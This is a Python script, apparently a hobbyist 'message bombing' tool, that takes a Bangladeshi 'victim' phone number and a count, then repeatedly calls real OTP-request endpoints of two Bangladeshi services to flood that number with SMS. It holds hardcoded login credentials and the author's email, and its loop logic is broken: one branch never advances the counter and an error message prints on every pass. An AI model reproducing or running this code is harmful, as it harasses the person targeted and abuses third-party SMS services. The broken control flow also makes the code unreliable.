#!/usr/bin/env python
# Author : Evan Al Mahmud Irfan
# Github : https://github.com/sacrobrent
import os
import requests
from time import sleep
from colorama import Fore
from getpass import getpass


print(
    Fore.GREEN
    + """
                    ____                  _   __   __
                   |  _ \                | |  \ \ / /
                   | |_) | ___  _ __ ___ | |__ \ V / 
                   |  _ < / _ \| '_ ` _ \| '_ \ > <  
                   | |_) | (_) | | | | | | |_) / . \ 
                   |____/ \___/|_| |_| |_|_.__/_/ \_\  
                       
\n          Author : Evan Al Mahmud Irfan (Full Stack dev & Linux SysAdmin)
          Github : https://github.com/sacrobrent
          Email  : evanalmahmudirfan@gmail.com
    """
)
print(
    Fore.RED
    + "          This is a Bangladeshi Message Bombing Tool.\n          Don't Use for any bad purpose."
)

nameVar = input("\n Enter Your Name : ")
print("please Wait a sec...")
sleep(3)
os.system("clear")
# login credentials
credentials = ["evanhaxxxor", "bombx111"]

# take username and password from user
print(f"\n\nWelcome {nameVar},\nBefore Using This Tool You Have To Login First. \n")
username = input(Fore.LIGHTBLACK_EX + "Enter Username : ")
password = getpass("Enter Password : ")

# check username and password
if username == credentials[0] and password == credentials[1]:
    print(f"Congrats {nameVar}, you Loggen-in Successfully.")
    sleep(2)
    os.system("clear")
    victimNumber = input(
        Fore.YELLOW + " Enter Bangladeshi Phone Number (Include +880) : "
    )
    messageAmount = int(input("How Many messages you want to send : "))
    minimumAmoundofMessage = 1
    if len(victimNumber) == 11:
        while minimumAmoundofMessage <= messageAmount:
            try:
                if "014" in victimNumber or "019" in victimNumber:
                    r = requests.post(
                        "https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",
                        data={"mobile": victimNumber},
                    )
                else:
                    url = (
                        "https://stage.bioscopelive.com/en/login/send-otp?phone=88"
                        + victimNumber
                        + "&operator=bd-otp"
                    )
                    r = requests.get(url)
                    print(
                        Fore.GREEN
                        + f"\nSuccessfully {minimumAmoundofMessage} SMS sent to {victimNumber}"
                    )
                    minimumAmoundofMessage = minimumAmoundofMessage + 1
            except:
                print("Something w\Wrong, Please Try Again Later.")
            else:
                print("\nThe Number You Entered is Incorrect.")
else:
    print(
        Fore.RED
        + f"\nI'm Sorry {nameVar}, You Enter Wrong Login Information,Please Try Again.\n"
    )
    # Developer Information
    developerInformation = input("Get developer Information (y/n) : ")
    if developerInformation == "y" or developerInformation == "Y":
        print(
            "\nName : Evan Al Mahmud Irfan\nFull Stack Developer & linux System Administrator.\nEmail : evanalmahmudirfan@gmail.com"
        )
    if developerInformation == "n" or developerInformation == "N":
        os.system("clear")
        exit()
